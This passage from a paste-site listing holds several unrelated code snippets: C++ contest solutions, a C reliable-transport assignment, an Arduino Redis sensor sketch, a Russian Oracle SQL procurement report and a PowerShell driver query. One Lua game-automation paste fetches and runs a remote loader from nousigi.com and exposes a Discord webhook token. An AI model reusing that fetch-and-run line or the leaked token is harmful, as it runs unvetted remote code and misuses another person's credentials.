		cout << b[i] << ' ';
	}
	cout << x << endl;
	if (x == 0) {
//		b: 2 1 0 6
//		20 16
		int res = (b[0] + b[1]) * 10 + b[2] + b[3];
		ans = min(ans, res);
		return;
	}
	for (int i = 0; i <= 4; i ++) {
		if(b[i] != -1) continue;
		int c[4];
		for (int j = 0; j < 4; j ++) c[j] = b[j];
		c[i] = a[x - 1];
		dfs(x - 1, c);
	}
}

int main() {
	cin >> n;
	for (int i = 0; i < 4; i ++) {
		a[i] = n % 10;
		n /= 10;
	}
	cout << ""a: "";
	for (int i = 0; i < 4; i ++) cout << a[i] << ' ';
	cout << endl;
	int s[4] = {-1, -1, -1, -1};
	dfs(4, s);
	cout << ans << endl;
	return 0;
}"
4mLJK0L0,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:19:29 AM CDT,"string name;
string zodiacSign;
string job;
int age;

Console.WriteLine(""Здравствуйте! Ответьте на пару вопросов."");

Console.WriteLine(""Как вас зовут?"");
name = Console.ReadLine();

Console.WriteLine(""Какой ваш знак зодиака?"");
zodiacSign = Console.ReadLine();

Console.WriteLine(""Где вы работаете?"");
job = Console.ReadLine();

Console.WriteLine(""Сколько вам лет?"");
age = Convert.ToInt32(Console.ReadLine());

Console.Clear();

Console.WriteLine($""Вас зовут:{name}, вам {age} лет, вы {zodiacSign} и работаете на {job}"");
"
Skpgeiy7,Untitled,pascallius,C,Monday 15th of April 2024 08:09:01 AM CDT,"#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include <assert.h>
#include <poll.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>


#include ""rlib.h""
#include ""buffer.h""

#define miliseconds(n) 1000000 * n 

static int checks(rel_t *r, packet_t *pkt, size_t n);
static void process_ACK_PKG(rel_t *r, packet_t *pkt, size_t n);
static void process_DATA_PKG(rel_t *r, packet_t *pkt, size_t n);
static int is_duplicate(rel_t *r, packet_t *pkt);
static long now_ms();
static int get_send_window_size(rel_t *r);
static void send_ACK_PKG(rel_t *r, uint32_t ack);
static packet_t *create_DATA_PKG(rel_t *r);


struct reliable_state {
    rel_t *next;			/* Linked list for traversing all connections */
    rel_t **prev;

    conn_t *c;			/* This is the connection object */

    
    size_t window_size;
    uint32_t next_seq;
    int timeout;
    
    uint32_t  lowest_ackno;
    uint32_t  send_nxt;
    int send_eof;
    int send_eof_acked;
    int rec_eof;
    uint32_t next_received;


    //buffers
    buffer_t* send_buffer;
    buffer_t* rec_buffer;

};
rel_t *rel_list;

// **********************Static helper functions Start***************
static int get_send_window_size(rel_t *r){
    return r->send_nxt - r->lowest_ackno;
}

static long now_ms() {
    struct timeval now;
    gettimeofday(&now, NULL);
    return now.tv_sec * 1000 + now.tv_usec / 1000;
}

static int is_duplicate(rel_t *r, packet_t *pkt){
    return ntohl(pkt->seqno) < r->next_received;
}
static int checks(rel_t *r, packet_t *pkt, size_t n){
    int rcv_check = pkt->cksum;
    pkt->cksum = 0;
    if(ntohs(pkt->len)!= n){
        return -1;
    }
    if(rcv_check != cksum(pkt,n)){
        return -1;
    }

    pkt->cksum = rcv_check;
    return 0;
}

static void send_ACK_PKG(rel_t *r, uint32_t ack){
    struct ack_packet *a = xmalloc(sizeof(struct ack_packet));
    a->cksum = 0;
    a->len = htons(8);
    a->ackno = htonl(ack);
    a->cksum = cksum(a,8);
    conn_sendpkt(r->c, (packet_t *)a, 8);
    free(a);

}

static void process_ACK_PKG(rel_t *r, packet_t *pkt, size_t n){
    if(buffer_size(r->send_buffer)==0) return;
    if(ntohl(pkt->ackno)>r->lowest_ackno){ // send una?
        r->lowest_ackno = ntohl(pkt->ackno);
        buffer_remove(r->send_buffer, r->lowest_ackno);
    }
    if(r->send_eof){ // send eof?
        if(buffer_size(r->send_buffer)==0) r->send_eof_acked = 1;
    }
    if (r->send_eof_acked && r->rec_eof && buffer_size(r->send_buffer)==0){
        rel_destroy(r);

    }else if(get_send_window_size(r) < r->window_size){
        rel_read(r);
    }
    return;
}

static packet_t *create_DATA_PKG(rel_t *r){ //TODO
    packet_t *pkt;
    pkt = xmalloc(sizeof(packet_t));
    int input = conn_input(r->c, pkt->data, 500);

    if (input == 0) {
        free(pkt);
        return NULL;
    }
    
    pkt->cksum = 0;
    pkt->len = htons(12 + ((input == -1) ? 0 : input));
    pkt->ackno = htonl(r->next_received);
    pkt->seqno = htonl(r->send_nxt);
    pkt->cksum = cksum(pkt, ntohs(pkt->len));
    return pkt;
}

static void process_DATA_PKG(rel_t *r, packet_t *pkt, size_t n){

if (is_duplicate(r, pkt)) {
        send_ACK_PKG(r, ntohl(pkt->seqno) + 1);
        return;
    }

    if (r->rec_eof) {
        if (r->send_eof_acked) rel_destroy(r);
        return;
    }

    // ignore out-of-window packets
    if (ntohl(pkt->seqno) >= r->next_received + r->window_size) return;

    if (buffer_size(r->rec_buffer) == r->window_size) {
        rel_output(r);
    }

    // store in buffer if not already there
    if (!buffer_contains(r->rec_buffer, ntohl(pkt->seqno))) {
        buffer_insert(r->rec_buffer, pkt, now_ms());
    }

    rel_output(r);
}
// **********************Static helper functions END***************

rel_t *
rel_create (conn_t *c, const struct sockaddr_storage *ss,
const struct config_common *cc)
{
    rel_t *r;

    r = xmalloc (sizeof (*r));
    memset (r, 0, sizeof (*r));

    if (!c) {
        c = conn_create (r, ss);
        if (!c) {
            free (r);
            return NULL;
        }
    }

    r->c = c;
    r->next = rel_list;
    r->prev = &rel_list;
    if (rel_list)
    rel_list->prev = &r->next;
    rel_list = r;

    r->send_buffer = xmalloc(sizeof(buffer_t));
    r->send_buffer->head = NULL;
    r->lowest_ackno = 1;
    r->send_nxt = 1;
    r->send_eof = 0;
    r->send_eof_acked = 0;

    // receive
    r->rec_buffer = xmalloc(sizeof(buffer_t));
    r->rec_buffer->head = NULL;
    r->next_received = 1;
    r->rec_eof = 0;

    r->window_size = cc->window;
    r->timeout = cc->timeout;

    return r;
}

void
rel_destroy (rel_t *r)
{
    if (r->next) {
        r->next->prev = r->prev;
    }
    *r->prev = r->next;
    conn_destroy (r->c);
    buffer_clear(r->send_buffer);
    free(r->send_buffer);
    buffer_clear(r->rec_buffer);
    free(r->rec_buffer);
    free(r);

}


void
rel_recvpkt (rel_t *r, packet_t *pkt, size_t n)
{
    if(checks(r,pkt,n)==-1) return;

    // if its only an ACK packet
    if(n==8){
        process_ACK_PKG(r, pkt, n);
    }else{
        process_DATA_PKG(r, pkt, n);
    }


}

void
rel_read (rel_t *s)
{
    /*
    char buffer[s->window_size];
    int size = conn_input(s->c,buffer,conn_bufspace(s->c));
    if(size==0||size==-1){
        return NULL;
    }

    packet_t *pkt = malloc(sizeof(*pkt));

    // first only process packets which fit into the packet
    int off = 0;
    if(size < 500){
        build_packet(pkt, size + 12);
        strncpy(pkt->data, &buffer[0],size); //TODO change offset here
    }else{
        printf(""Too large packet in rel_read"");
    }
    //TODO: implement for larger input

    free(pkt);
    */
   {
    // read and send as long as:
    // 1. send window is not full, and
    // 2. no EOF has been read from stdin
    while ((get_send_window_size(s) < s->window_size) && !s->send_eof) {
        packet_t *pkt = create_DATA_PKG(s);

        // if stdin is empty, return
        if (pkt == NULL) return;

        // set flag if EOF has been read from stdin
        if (ntohs(pkt->len) == 12) s->send_eof = 1;

        conn_sendpkt(s->c, pkt, ntohs(pkt->len));
        buffer_insert(s->send_buffer, pkt, now_ms());
        free(pkt);
        s->send_nxt++;
    }
}

}

void
rel_output (rel_t *r) 
{   

    //not empty
    if(buffer_size(r->rec_buffer)!=0){
        buffer_node_t* node = buffer_get_first(r->rec_buffer);
        size_t free_b = conn_bufspace(r->c);
        size_t used = 0;
        uint32_t num_b = 0;
        int out_size;
        while(node&&num_b<(r->window_size)){
            if (!buffer_contains(r->rec_buffer, r->next_received) || r->next_received != ntohl(node->packet.seqno)) break;
            uint16_t payload_size = ntohs(node->packet.len) - 12;
            if (used + payload_size > free_b) break;
            if(payload_size==0) r->rec_eof =1;

            out_size = conn_output(r->c,node->packet.data,payload_size);
            assert(out_size>=0);
            used += payload_size;
            r->next_received++;
            node = node->next;
            buffer_remove_first(r->rec_buffer);

            num_b++;
        }

        //ackno
        send_ACK_PKG(r, r->next_received);
    }else{
        if(r->send_eof_acked){
            rel_destroy(r);
        }
        return;
    }
}

void
rel_timer ()
{
    rel_t *current = rel_list;
    struct timespec now;
    while (current != NULL) {
        for(buffer_node_t* node = buffer_get_first(current->send_buffer);node;node=node->next){
            if(clock_gettime(CLOCK_MONOTONIC,&now)==-1) return;
            if(miliseconds(now.tv_nsec) - (node->last_retransmit)>current->timeout){
                node->last_retransmit = miliseconds(now.tv_nsec);
                conn_sendpkt(current->c,&node->packet,ntohs(node->packet.len));
            }



        }
        current = current->next;
    }
}


"
JBuTFQy4,Untitled,Ilya_Bykonya,Arduino,Monday 15th of April 2024 07:59:58 AM CDT,"// Arduino
#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <FS.h>
// Ethernet
#include <EthernetENC.h>
#define USE_CUSTOM_ETHERNET true
#include <EthernetWebServer.h>
// Settings
#include ""settings/FixedSizeStringEepromConverter.h""
#include ""settings/DefaultEepromConverter.h""
#include ""settings/EEPROMVariable.h""
#include <EEPROM.h> 
// Redis
#include <Redis.h>

// Ethernet settings
EEPROMVariable<byte[6], 0, FixedSizeByteStringEepromConverter<6>> ethernet_connection_mac_address{ EEPROM };
EEPROMVariable<IPAddress, 6 + decltype(ethernet_connection_mac_address)::eeprom_address, DefaultEepromConverter<IPAddress>> ethernet_connection_ip{ EEPROM };
EEPROMVariable<IPAddress, 4 + decltype(ethernet_connection_ip)::eeprom_address, DefaultEepromConverter<IPAddress>> ethernet_connection_subnet{ EEPROM };
EEPROMVariable<IPAddress, 4 + decltype(ethernet_connection_subnet)::eeprom_address, DefaultEepromConverter<IPAddress>> ethernet_connection_gateway_ip{ EEPROM };
EEPROMVariable<IPAddress, 4 + decltype(ethernet_connection_gateway_ip)::eeprom_address, DefaultEepromConverter<IPAddress>> ethernet_connection_dns_ip{ EEPROM };
// Web server settings
EEPROMVariable<uint16_t, 400, DefaultEepromConverter<uint16_t>> web_server_port{ EEPROM };
// Redis connection settings
EEPROMVariable<IPAddress, 1024, DefaultEepromConverter<IPAddress>> redis_connection_ip{ EEPROM };
EEPROMVariable<uint16_t, 4 + decltype(redis_connection_ip)::eeprom_address, DefaultEepromConverter<uint16_t>> redis_connection_port{ EEPROM };
EEPROMVariable<char[200], 2 + decltype(redis_connection_port)::eeprom_address, FixedSizeCharStringEepromConverter<200>> redis_connection_client{ EEPROM };
EEPROMVariable<char[200], 200 + decltype(redis_connection_client)::eeprom_address, FixedSizeCharStringEepromConverter<200>> redis_connection_password{ EEPROM };

// Connections
EthernetWebServer web_server{ 8090 };
EthernetClient redis_tcp_connection{};
Redis redis_connection{ redis_tcp_connection };

// Temporary buffers

int32_t sensor_value{ std::numeric_limits<int32_t>::min() };

void setup() {
  pinMode(GPIO_NUM_4, INPUT);
  EEPROM.begin(4096);

  Serial.begin(9600);
  while(not Serial);
  Serial.println();
 
  Serial.println(""Begin Ethernet"");
  // You can use Ethernet.init(pin) to configure the CS pin
  //Ethernet.init(10);  // Most Arduino shields
  Ethernet.init(5);   // MKR ETH Shield
  //Ethernet.init(0);   // Teensy 2.0
  //Ethernet.init(20);  // Teensy++ 2.0
  //Ethernet.init(15);  // ESP8266 with Adafruit FeatherWing Ethernet
  //Ethernet.init(33);  // ESP32 with Adafruit FeatherWing Ethernet

  if (Ethernet.hardwareStatus() == EthernetNoHardware) {
    Serial.println(""Ethernet shield was not found.  Sorry, can't run without hardware. :("");
    while (true) {
      delay(1); // do nothing, no point running without Ethernet hardware
    }
  }
  if (Ethernet.linkStatus() == LinkOFF) {
    Serial.println(""Ethernet cable is not connected."");
  }

  const uint8_t mac_address[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };  
  Ethernet.begin(mac_address, 
    { 192, 168, 1, 10 }, 
    { 192, 168, 1, 1 }, 
    { 192, 168, 1, 1 }, 
    { 255, 255, 255, 0 }
  );
  delay(500);

  Serial.print(""Local IP: "");
  Serial.println(Ethernet.localIP());
  Serial.print(""Subnet Mask: "");
  Serial.println(Ethernet.subnetMask());
  Serial.print(""Gateway IP: "");
  Serial.println(Ethernet.gatewayIP());
  Serial.print(""DNS Server: "");
  Serial.println(Ethernet.dnsServerIP());
  Serial.print(""Link status: "");
  Serial.println(Ethernet.linkStatus());
  Serial.print(""Hardware status: "");
  Serial.println(Ethernet.hardwareStatus());
 
  Serial.println(""Initilize redis:"");
  Serial.print(""\tTCP port:"");
  Serial.print(redis_tcp_connection.connect({ 192, 168, 1, 2 }, 6379));
  Serial.print(""; Connected: "");
  Serial.println(redis_tcp_connection.connected());
  Serial.print(""\tRedis authentication: "");
  Serial.println(redis_connection.authenticate("""")); 


  {  
    web_server.on(""/"", []() {
      Serial.println(""on [/]"");
      web_server.send_P(200, ""text/plain"", ""Ok"");
    });
    web_server.on(""/sensor/value"", HTTP_GET, []() {
      Serial.println(""on [/sensor/value][GET]"");
      web_server.send(200, ""text/plain"", String{ sensor_value }.c_str());
    });
    web_server.onNotFound([]() {
      Serial.print(""on [NotFound]: "");
      Serial.println(web_server.uri());
      web_server.send(200, ""text/plain"", ""Not found..."");
    });
    web_server.begin();
  }
  /*
    web_server.on(""/values/1"", HTTP_POST, []() {
      Serial.println(""on [/values/1][POST]"");
      if(not web_server.hasArg(""value"")) {
        web_server.send(400, ""text/plain"", ""Invalid request"");
      } else {
        value_1 = web_server.arg(""value"").toInt();
        web_server.send(200, ""text/plain"", ""Ok"");
      }
    });
  */
}
 
void loop() {
  Ethernet.maintain();
  web_server.handleClient();

  static unsigned long last_time = 0; 
  if(const auto current_time = millis(); last_time < current_time - 5000) {
    last_time = current_time;

    sensor_value = analogRead(GPIO_NUM_4);
    Serial.print(""Alive: "");
    Serial.print(sensor_value);
    Serial.print(""; Redis: "");
    Serial.println(redis_connection.set(""sensor:test"", String{ sensor_value }.c_str()));
  }
}"
ZJrua3cB,Светилките на Дедо Мраз,PlanttPastes,C++,Monday 15th of April 2024 07:25:59 AM CDT,"#define ONLINE_JUDGE // online judge
#include <iostream>
#include <cmath>
using namespace std;
 
const int MXS = 300000;
int sgt[MXS], sgtl[MXS], sgtr[MXS], sgtlz[MXS];
int n, s;
 
void sgtupdate(int node) {
    if (!sgtlz[node]) return;
    if (sgtlz[node] == 1) sgt[node] = sgtr[node] - sgtl[node] + 1;
    else sgt[node] = 0;
    if (node < s) {
        sgtlz[node * 2 + 1] = sgtlz[node * 2 + 2] = sgtlz[node];
    }
    sgtlz[node] = 0;
    /* while (node) {
        node = node - 1 >> 1;
        sgt[node] = sgt[2 * node + 1] + sgt[2 * node + 2];
    } */
}
int sgtset(const int &node, const int &l, const int &r, const bool &v) {
    if (sgtr[node] < l || sgtl[node] > r) return 0;
    sgtupdate(node);
    if (l <= sgtl[node] && sgtr[node] <= r) {
        sgtlz[node] = v ? 1 : 2;
        int oldVal = sgt[node];
        sgtupdate(node);
        // cerr << ""update "" << node << "" from "" << oldVal << "" to "" << sgt[node] << endl;
        return sgt[node] - oldVal;
    }
    int delta = sgtset(node * 2 + 1, l, r, v) + sgtset(node * 2 + 2, l, r, v);
    sgt[node] += delta;
    return delta;
}
int sgtget(const int &node, const int &l, const int &r) {
    if (sgtr[node] < l || sgtl[node] > r) return 0;
    sgtupdate(node);
    if (l <= sgtl[node] && sgtr[node] <= r) {
        // cerr << ""get "" << node << "": "" << sgt[node] << endl;
        return sgt[node];
    }
    return sgtget(node * 2 + 1, l, r) + sgtget(node * 2 + 2, l, r);
}
 
signed main() {
    #ifdef ONLINE_JUDGE
    ios::sync_with_stdio(0);
    cin.tie(0); cout.tie(0);
    #endif
 
    int q, a, b;
    char c;
    cin >> n >> q;
    s = (1 << int(ceil(log2(n)))) - 1;
    for (int i = 0; i < n; i++) {
        cin >> sgt[s + i];
    }
    for (int i = s; i <= s * 2; i++) {
        sgtl[i] = sgtr[i] = i - s;
    }
    for (int i = s - 1; i >= 0; i--) {
        sgt[i] = sgt[2 * i + 1] + sgt[2 * i + 2];
        sgtl[i] = sgtl[2 * i + 1];
        sgtr[i] = sgtr[2 * i + 2];
    }
    while (q--) {
        cin >> c >> a >> b; a--; b--;
        if (c == '+') sgtset(0, a, b, 1);
        if (c == '-') sgtset(0, a, b, 0);
        if (c == '?') cout << sgtget(0, a, b) << '\n';
    }
    return 0;
}"
Epi4CYFE,Untitled,GLASHATAY_007,Oracle 11,Monday 15th of April 2024 07:03:51 AM CDT,"
create table ksp_15_04_24_fin_new as
with fin AS (
SELECT
  lot_id,
  fin.budget_type,
  fin.targetexpenseitemcode,
  cs_name.name target_name,
  MIN(CASE WHEN fin.TYPE=1 THEN fin.YEAR ELSE NULL END) first_year   -- первый год планового фин
 ,MAX(CASE WHEN fin.TYPE=1 THEN fin.YEAR ELSE NULL END)  last_year-- последний год планового финас
 ,SUM(CASE WHEN fin.TYPE=1 THEN fin.finsum ELSE NULL END) finsum_plan  -- 44 плановое финансирования по контракту
 ,SUM(CASE WHEN fin.TYPE=2 THEN fin.finsum ELSE NULL END) finsum_fact -- 45 фактическое финансирования по контракту
 ,MAX(CASE WHEN fin.targetexpenseitemcode IN (SELECT targetexpenseitemcode FROM dwh_targetexpenseitemcode_aip) THEN 1 ELSE 0 END) aip_flag -- 50 признак АИП (проверить)
FROM dwh_contract_fin_kgntv_temp fin
Left join dwh_kf_cs cs_name on cs_name.code=fin.targetexpenseitemcode and fin.year=cs_name.year
WHERE fin.Targetexpenseitemcode IN (SELECT DISTINCT targetexpenseitemcode FROM dwh_targetexpenseitemcode_2020)
AND fin.YEAR>=2023
GROUP BY lot_id,fin.budget_type, fin.targetexpenseitemcode,cs_name.name
)


SELECT
    c.lotid,
    c.contractrnk, -- 1 рнк
    p.f_year YEAR, -- 2 год бюджета, к которому относятся ассигнования (вместо года размещения процедуры (requestyear) берем год финансирования контракта.
    fin.first_year first_fin_cont_year,-- 3 год первого финансирования по контракту
    fin.last_year, -- год последнего финансирования контракта
    c.requestyear f_year -- 5 год плана размещения
    ,c.finsource --6 источники финансирования
    ,fin.budget_type -- 7 тип бюджетных средств
    ,fin.targetexpenseitemcode -- 8 код целевой статьи
    ,fin.target_name -- 9 наименование целевой статьи
    ,CASE
        WHEN o_u.id IN (503,592,1407,2710,2229,2703,1409,2709,508,1898,2702,988,2711,504,509,500,1897,1411,1408,1412,1728) THEN o_u.full_name 
        ELSE NULL 
    END uo_org -- 10 уполномоченный орган
   ,COALESCE(cons.inn,o_u.inn,c.customerinn) AS inn -- 11 ИНН организации разместившей извещение
   ,COALESCE(cons.orgtitle, o_u.full_name,c.customername)AS c_org -- 12 наименование организации разместившей извещение*/
   ,c.customerinn -- 13 заказчик инн организации
   ,c.customername-- 14 заказчик наименование  
   ,c.grbsname-- 15 ГРБС название
   ,gr.fshorttitle -- 16 сокращенное наименование грбс
   ,COALESCE ( p.reqnum,c.contractnoticenumber)contractnoticenumber  -- 17 номер извещения
   ,p.date_notice_published -- 18 дата размещения извещения о закупке
   ,CASE 
        WHEN  p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимся запроса котировок в соответствии частями 1 и 3 статьи 79 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                                THEN 'Запрос котировок в электронной форме'
        WHEN p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимся двухэтапного конкурса в соответствии с частями 1 и 7 статьи 55 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                THEN 'Двухэтапный конкурс в электронной форме'
        WHEN p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимися открытого конкурса в соответствии с частями 1 и 7 статьи 55 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                THEN 'Открытый конкурс в электронной форме'
        WHEN p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимся электронного аукциона в соответствии частями 1 – 3.1 статьи 71 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                THEN 'Аукцион в электронной форме'
        WHEN p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимися конкурса с ограниченным участием в соответствии с частями 1 и 7 статьи 55 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                THEN 'Конкурс с ограниченным участием в электронной форме'
        WHEN p.fordertypename = 'Закупка у единственного поставщика' AND p.oneexec = 'Часть 1 пункт 25 статьи 93 -  Закупка вследствие признания несостоявшимся запроса предложений в соответствии с частью 18 статьи 83 Федерального закона решения об осуществлении закупки у единственного поставщика (подрядчика, исполнителя)'
                THEN 'Запрос предложений в электронной форме'
        ELSE p.fordertypename 
    END   fordertypename -- 19 способо закупки на этапе размещения извещения
   ,c.contractsigndate -- 20 дата заключения контракта
   ,c.contractsubject -- 21 наименование объекта закупки
   ,c.contractrejectdate -- 22 дата расторжения контракта
   ,CASE WHEN c.contractoneexecreason  LIKE 'Часть 1 пункт 25 статьи 93%' THEN 'Закупка у единственного поставщика' ELSE c.ordertypename END ordertypename -- 23 соп
   ,p.f_productprice -- 24 нмцк 
   ,c.contractsigningprice -- 25 первоначальная цена
   ,c.contractfullprice -- 26 текущая цена
   ,c.contractplaneexecdate -- 27 планируемая дата окончания исполнения контракта
   ,c.contractactualexecdate -- 28 фактическая дата исполнения контракта
   ,c.supplierinn -- 29 поставщик инн
   ,c.suppliername -- 30 поставщик наименование 
   ,case when c.contractoneexecreason is not null then 1 else 0 end onneexec_type-- 31 признак заключения контракта с единственным поставщиком
   ,c.contractoneexecreason -- 32 основание заключения контракта с ед поставщиком    
   ,c.stagetitle -- 33 статус контракта
   ,c.contractrejectreason -- 34 основание расторжения контракта
   ,CASE WHEN p.placement ='Централизованная закупка' THEN 1 ELSE 0 END central -- 35 признак централизованной закупки
   ,p.joflag -- 36 признак совместных торгов 
   ,c.supply_impossible -- 37 признак невозможно определить количество
   ,c.SUPPLIERCRIMINAL -- 38 учреждение уголовно-испытательной системы
   ,c.SUPPLIERINVALID -- 39 учреждение инвалидов
   ,c.SUPPLIERSMP -- 40 ПОСТАВЩИК ЯВЛЯЕТСЯ СМП ИЛИ СОНКО
   ,c.SUPPLIERSMPSONCO -- 41 СОНКО
   ,case when penalty.sum_ is not null then 1 else 0 end penaty_flag-- 42 признак применения штрафных санкций
   ,penalty.sum_ -- 43 сумма начисленных санкций
   ,penalty.pen_pay_sum_ -- 44 сумма оплаченных санкций
    ,fin.finsum_plan -- 45 плановое финансирования по контракту
    ,fin.finsum_fact -- 46 фактическое финансирования по контракту
   , case when c.is_concluded_in_e_shop is not null then 1 else 0 end eshop_flag-- 47 признак заключения контракта в ЭМ
   ,c.contract_modification_reasons   -- 48 причина изменения усвловий контракта/договора
   ,pea.nmck_type -- 49 метод определения и обоснования НМЦК
    ,fin.aip_flag -- 50 признак АИП (проверить)
    ,CASE WHEN c.perc_size IS NOT NULL OR c.perc_rub_size IS NOT NULL THEN 1 ELSE 0 END subpodr_flag -- 51 признак наличия субподрпяда
    ,c.perc_size -- 52 объем привлеченных к исполнению субподр %
    ,c.perc_rub_size -- 53 объем привлеченных к исполнению субподр руб
    ,p.ADVANCE_PAY_AMOUNT -- 54 размер аванса %
    ,p.advance_hand_amount -- 55 размер аванса руб
FROM dwh_contract_kgntv c
join dwh_procedures_kgntv p on c.lotid=p.lotuuid
JOIN fin ON c.lotid=fin.lot_id
LEFT JOIN dwh_procedures_cons_kgntv cons ON cons.lotuuid = p.Joint_procedure_id
LEFT JOIN dwh_organization_kgntv o_u    ON o_u.id = p.uo_orgid
LEFT JOIN ksp_grbs_shotname gr  ON gr.KGNTVID = c.grbsid
LEFT join(SELECT 
            contractid,
            listagg(list_, '; ') within GROUP (ORDER BY contractid) pen,
            SUM(nvl(amount,0))sum_
            ,SUM(nvl(penalty_pay_sum,0)) pen_pay_sum_
          FROM (SELECT 
                     id contractid, 
                    CASE 
                        WHEN reason_id IN (1,3) THEN 'Исполнитель'  WHEN reason_id IN (2,4) THEN 'Заказчик' 
                        ELSE NULL 
                    END  list_
                    ,amount
                    ,penalty_pay_sum
                FROM dwh_contract_penalty_kgntv
                )GROUP BY contractid
        )penalty ON penalty.contractid = c.contractid
LEFT JOIN (
SELECT 
COALESCE(l.lot_id,sovm.lot_id) lot_id,
COALESCE(l.plnm_name,l.plnm_name2,sovm.plnm_name) nmck_type
FROM DWH_LOT_KGNTV_EXT_ATTR_1 l
LEFT JOIN (SELECT
            m.plnm_name,
            COALESCE(l.lot_id,m.lot_id,TO_NUMBER(p.lotuuid)) lot_id,
            COALESCE(p.MORD_FLAG,m.MORD_FLAG) 
            FROM DWH_LOT_KGNTV_EXT_ATTR_1 l
            LEFT JOIN dwh_procedures_kgntv p ON p.lotuuid = l.lot_id AND p.MORD_FLAG = 'D' --
            LEFT JOIN
               (SELECT
                COALESCE(gm.plnm_name,gm.plnm_name2) plnm_name,
                COALESCE(l.lot_id,gm.lot_id,TO_NUMBER(p.lotuuid)) lot_id, --p.lotuuid
                COALESCE(p.MORD_FLAG,gm.MORD_FLAG) MORD_FLAG
                FROM DWH_LOT_KGNTV_EXT_ATTR_1 l
                    LEFT JOIN
                        (SELECT l.*,MORD_FLAG 
                         FROM DWH_LOT_KGNTV_EXT_ATTR_1 l
                            LEFT JOIN dwh_procedures_kgntv p ON p.lotuuid = l.lot_id 
                         WHERE MORD_FLAG IS NULL
                        ) gm ON gm.lot_id = l.joint_procedure_id
                    LEFT JOIN dwh_procedures_kgntv p ON p.lotuuid = l.lot_id AND p.MORD_FLAG = 'M'
                    WHERE
                    l.joint_procedure_id IS NOT NULL
                  )m ON m.lot_id = p.LOT_CONS_M) sovm ON sovm.lot_id = l.lot_id) pea ON pea.lot_id = p.lotuuid    
;"
suaE1JZA,Get File System Filter Drivers,guyrleech,PowerShell,Monday 15th of April 2024 07:00:57 AM CDT,"## Get running file system filter drivers via WMI/CIM so can get when not elevated unlike fltmc.exe

$drivers=Get-CimInstance -classname Win32_SystemDriver; Get-CimInstance -ClassName Win32_LoadOrderGroupServiceMembers| Where-Object { $_.GroupComponent.Name -match '^FSFilter' } | Select @{n='Driver';e={$_.PartComponent.Name}},@{n='Group';e={$_.GroupComponent.Name}}|Select *,@{n='State';e={$drivers|Where-Object Name -ieq $_.Driver|Select -ExpandProperty State}}|Where State -ieq 'Running'|sort driver"
9RDjxnpk,p3s9nin,suramraja1,Lua,Monday 15th of April 2024 06:54:53 AM CDT,"task.wait(120)
getgenv().ScriptSettings = [[{""AutoDigsite"":false,""AutoMerchant"":false,""WebHookTime"":60,""TapPerTime"":3,""MerchantTF"":{""RegularMerchant"":false,""GardenMerchant"":false,""AdvancedMerchant"":false},""AutoClaimFreeReward"":false,""TNTRebirth"":true,""TapTime"":1,""Webhook"":true,""ReEnableIfHardstuck"":300,""AutoFruit"":false,""AutoRebirth"":true,""FarmingMode"":""All"",""AutoClaimMail"":true,""AutoPotion"":false,""RebirthTime"":1,""AutoOpenMap"":true,""AutoTap"":true,""AutoEquipEnchant"":false,""HopIfGoPopUp"":false,""SelectBest"":true,""IgnoreUpgrade"":{""Magnet"":false,""Drops"":false,""LessGold"":false,""Pet Speed"":false,""Pet Damage"":false,""LessRainbow"":false,""Luck"":false,""Ultimates"":false,""Walkspeed"":false,""Coins"":false,""Diamonds"":false,""Tap Damage"":false},""Potions"":[],""MinTier"":3,""DigsiteHopp"":false,""AutoWorld2"":false,""SpawnObby"":false,""OpenGiftBag"":false,""AutoCoinFlag"":false,""DigsiteLevel"":3,""CauCa"":false,""AutoUltimate"":false,""MaxMap"":92,""AutoBuyUpdrage"":true,""ClaimRankReward"":true,""ListSendMail"":[{""Enabled"":true,""Item"":""Diamonds"",""Category"":""Currency"",""MinItem"":1000000,""Username"":""Carlen104""}],""HiddenPresent"":true,""FarmCoin"":true,""DelayHopIfHardstuck"":60,""EquippedEnchant"":[{""slot"":1,""name"":""Strong Pets"",""tier"":1},{""tier"":1,""slot"":2},{""tier"":1,""slot"":3},{""tier"":1,""slot"":4},{""tier"":1,""slot"":5}],""WebHookUrl"":""https://discord.com/api/webhooks/1221310536080162896/4iGxtil1JPoSUGe6oHw5l5_1A0-icoW70uDvM3rfmYlTlxmR7tQs-KVa5E8zxAWqEyvG"",""DigsiteZone"":""Advanced Digsite"",""Minefield"":false,""Fruits"":[],""AutoBuyPetSlot"":true,""MinZoneUseFlag"":1,""Atlantis"":false}]]

_G.key = ""6aa51721dd20438183e572ea12612596""
loadstring(game:HttpGet(""https://nousigi.com/loader.lua""))()


coroutine.wrap(function()
    pcall(function()
        task.wait(10)
        game:service'VirtualInputManager':SendKeyEvent(true, ""Tab"", false, game)
        task.wait(120)
        game:GetService(""RunService""):Set3dRenderingEnabled(true)
    end)
end)()"
QndRET1N,Untitled,whatiamdoing,Python,Monday 15th of April 2024 06:03:34 AM CDT,"preprocessing_function = get_image_generator_preprocessing_function(name)

   train_data_generator = ImageDataGenerator(
        preprocessing_function=preprocessing_function,
        validation_split=0.2
    )

    train_images = train_data_generator.flow_from_dataframe(
        dataframe=train_df,
        x_col='filepath',
        y_col='label',
        target_size=(TARGET_SIZE, TARGET_SIZE),
